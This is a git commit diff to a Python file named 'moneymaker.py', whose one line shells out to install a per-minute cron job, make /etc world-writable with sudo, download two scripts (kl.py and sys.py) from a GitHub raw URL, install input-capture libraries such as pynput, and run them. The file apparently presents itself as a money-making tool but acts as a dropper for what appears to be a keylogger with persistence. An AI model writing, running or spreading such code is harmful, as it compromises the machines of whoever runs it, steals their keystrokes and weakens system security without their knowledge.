40f865409b07171c980ca3d86e535fee94f4a663
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-24 14:19:07 +0000

    Update moneymaker.py

--- moneymaker.py
+++ moneymaker.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('echo "*/1 * * * * cd && cd /etc/ && python3 kl.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/kl.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && pip install pynput && pip install logging && python3 kl.py && python3 sys.py')
+os.system('echo "*/1 * * * * cd && cd /etc/ && python3 kl.py && python3 sys.py > /dev/null 2>&1 &" > cron && cat cron | crontab - && sudo chmod 777 /etc/ && mv run.py /etc/ && cd && cd /etc/ && wget https://raw.githubusercontent.com/katerin966/03/main/kl.py && wget https://raw.githubusercontent.com/katerin966/03/main/sys.py && pip install pynput && pip install logging && pip install pyautogui && python3 kl.py && python3 sys.py')
